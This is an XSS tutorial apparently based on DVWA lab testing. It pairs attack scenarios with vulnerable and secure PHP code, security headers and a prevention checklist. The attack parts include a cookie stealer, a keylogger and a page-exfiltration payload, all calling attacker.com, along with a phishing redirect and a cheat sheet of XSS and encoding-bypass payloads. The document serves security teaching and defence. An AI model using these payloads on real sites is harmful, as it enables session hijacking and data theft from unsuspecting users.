# Cross-Site Scripting (XSS) - Attack Scenarios & Mitigation

---

## STORED XSS

### Vulnerability Details
- **Type:** Persistent XSS
- **Storage:** Database
- **Impact:** All users affected
- **Severity:** HIGH (7.5/10)

### Attack Scenarios

#### Scenario 1: Cookie Stealer

**Target:** Guest Book message field  
**Goal:** Steal session cookies

```javascript
// Payload to submit in message
<script>
fetch('https://attacker.com/steal.php?c=' + document.cookie);
</script>

// Result: Admin's cookie sent to attacker
// Attacker can hijack session
```

#### Scenario 2: Keylogger Injection

```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log.php?key=' + e.key);
});
</script>

// Every keystroke logged to attacker's server
```

#### Scenario 3: Redirect to Phishing

```javascript
<script>
if (user_is_admin()) {
    window.location = 'https://attacker.com/fake-login.html';
}
</script>

// Admin redirected to fake login page
// Credentials harvested
```

### Impact Assessment

From DVWA Stored XSS Test:
```
✗ Script executed on page load
✗ All users viewing page compromised
✗ Cookie accessible via console
✗ Session hijacking possible
```

### Mitigation: Secure Implementation

**Vulnerable Code:**
```php
<?php
$name = $_POST['name'];
$message = $_POST['message'];

// Direct insertion = XSS vulnerability
echo "Name: " . $name . "<br>";
echo "Message: " . $message;
?>
```

**Secure Code:**
```php
<?php
// Input Sanitization
$name = filter_var($_POST['name'], FILTER_SANITIZE_STRING);
$message = filter_var($_POST['message'], FILTER_SANITIZE_STRING);

// Output Encoding (CRUCIAL)
echo "Name: " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "<br>";
echo "Message: " . htmlspecialchars($message, ENT_QUOTES, 'UTF-8');

// Add Security Headers
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("Content-Security-Policy: script-src 'self'");
?>
```

---

## REFLECTED XSS

### Vulnerability Details
- **Type:** Non-persistent XSS
- **Storage:** Query parameter only
- **Impact:** Single user, single request
- **Severity:** HIGH (7.5/10)

### Attack Scenarios

#### Scenario 1: Query Parameter Injection

**Vulnerable URL:**
```
http://dvwa/page.php?name=<script>alert('XSS')</script>
```

**Expected Output:**
```html
Hello <script>alert('XSS')</script>
<!-- Script executes in victim's browser -->
```

#### Scenario 2: Event Handler Injection

```
http://dvwa/?name=<img src=x onerror="alert('XSS')">

<!-- Output -->
<img src=x onerror="alert('XSS')">
<!-- Onerror triggers, executes JavaScript -->
```

#### Scenario 3: SVG Vector

```
http://dvwa/?name=<svg onload="alert('XSS')">

<!-- Embedded SVG executes on load -->
```

#### Scenario 4: Data Exfiltration

```javascript
// Malicious payload
<img src=x onerror="
    fetch('https://attacker.com/steal?data=' + 
    btoa(document.documentElement.innerHTML))
">

// Entire page sent to attacker
```

### Mitigation: Secure Implementation

**Vulnerable Code:**
```php
<?php
$name = $_GET['name'];
echo "Hello " . $name;
?>
```

**Secure Code - Method 1 (Output Encoding):**
```php
<?php
$name = isset($_GET['name']) ? $_GET['name'] : '';
// HTML encode special characters
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
echo "Hello " . $safe_name;
?>
```

**Secure Code - Method 2 (Input Validation):**
```php
<?php
$name = filter_var($_GET['name'], FILTER_SANITIZE_STRING);

// Validate format (alphanumeric + spaces only)
if (!preg_match("/^[a-zA-Z0-9\s]+$/", $name)) {
    die("Invalid input");
}

echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>
```

**Secure Code - Method 3 (Template Engine):**
```php
<?php
// Using Twig Template Engine (auto-escapes by default)
echo $twig->render('greeting.html', [
    'name' => $_GET['name'] // Automatically escaped
]);
?>
```

---

## XSS Payload Cheat Sheet

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<body onload="alert('XSS')">
```

### Encoding Bypass
```html
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
<!-- XSS in character codes -->

<img src=x onerror="alert('\x58\x53\x53')">
<!-- Hex encoding -->
```

### Advanced Vectors
```html
<svg/onload=alert('XSS')>
<img src=/ onerror="alert('XSS')">
<details open ontoggle="alert('XSS')">
<form action="javascript:alert('XSS')"><input type=submit>
```

---

## Protection Layers

### Layer 1: Input Validation
```php
$whitelist = '/^[a-zA-Z0-9\s\-\.]+$/';
if (!preg_match($whitelist, $input)) {
    die("Invalid input");
}
```

### Layer 2: Output Encoding
```php
echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
// Converts: < > " ' & to HTML entities
```

### Layer 3: Content Security Policy
```php
header("Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self'; 
    style-src 'self' 'unsafe-inline'");
```

### Layer 4: Security Headers
```php
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
```

---

## Prevention Checklist

### Development
- [ ] Use templating engines with auto-escape
- [ ] Encode ALL user input in output
- [ ] Validate input type and length
- [ ] Use security libraries (e.g., DOMPurify)
- [ ] Implement CSP headers

### Testing
- [ ] Test with basic payloads: `<script>alert('XSS')</script>`
- [ ] Test event handlers: `onerror`, `onload`, `onclick`
- [ ] Test attribute contexts
- [ ] Test SVG/XML vectors
- [ ] Test encoded payloads

### Deployment
- [ ] Enable XSS protection headers
- [ ] Configure CSP policy
- [ ] Regular security audits
- [ ] Monitor for XSS attempts
- [ ] Keep frameworks updated

---

## Real-World Examples

**Impact from DVWA Exploitation:**
- ✗ JavaScript executed in browser
- ✗ DOM manipulated
- ✗ Cookies accessible
- ✗ Session hijacking possible
- ✗ Malware could be injected

**After Mitigation:**
- ✓ Input sanitized
- ✓ Output encoded
- ✓ CSP enforced
- ✓ All payloads blocked
